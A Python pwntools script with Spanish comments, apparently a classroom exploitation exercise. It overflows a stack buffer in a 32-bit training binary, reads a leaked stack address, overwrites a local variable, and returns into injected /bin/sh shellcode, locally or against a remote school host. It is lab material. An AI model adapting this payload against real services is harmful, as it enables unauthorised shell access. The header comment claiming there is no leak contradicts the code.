#!/usr/bin/python3
##############################
# En este ejercicio se comprueba si se altera una variable local mediante desbordamiento.
# Simplemente debemos setear el valor adecuado en el payload.
# Por otro lado no tenemos leak por lo que tenemos que desactivar ASLR para tener éxito.
#
#
# Se te ocurre alguna forma en la que podamos tener éxito sin desactivar ASLR y sin leak????
# Una pista: Esta técnica solo sería factible en 32 bits al tener un espacio de memoria más pequeño.
##############################
from pwn import *
elf = context.binary = ELF("bof")
libc = elf.libc
HOST = "www.iesvirgendelcarmen.com"
PORT = 10004

gs = '''
b start_level
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
	    return remote(HOST, PORT)
    else:
        return process(elf.path)


#Hay que calcular la dirección.
#ret2stack = 0xffffd56c+124+100


io = start()
#Lee de la salida estandar hasta Leak:
io.recvuntil('Leak: ')
#Lee de la salida estandar hasta retorno de carro
leak = io.recvline()
#Convierte la dirección de memoria robada, que es un string, a un entero. La dirección de memoria está en base 16 (hexadecimal).
leak = int(leak, 16)
print(hex(leak))
log.info('Enviando shellcode')


#Usamos una shellcode de shellcraft. Shellcodes que vienen en pwntools
print(shellcraft.i386.linux.sh())
shellcode = asm(shellcraft.i386.linux.sh())

#Generamos un payload en little endian para 32 bits
payload = flat (
    b"A"*(124),    #ebp-0x8c
    b"BBBB",       #ebp-0x10
    p32(100),      #ebp-0xc
    b"CCCC",       #ebp-0x8
    b"CCCC",       #ebp-0x4
    b"DDDD",       #ebp
    p32(leak+148),#ret
    shellcode,
    endianness = 'little', word_size = 32, sign = False
    )
#Enviamos el payload
io.sendline(payload)
io.interactive()
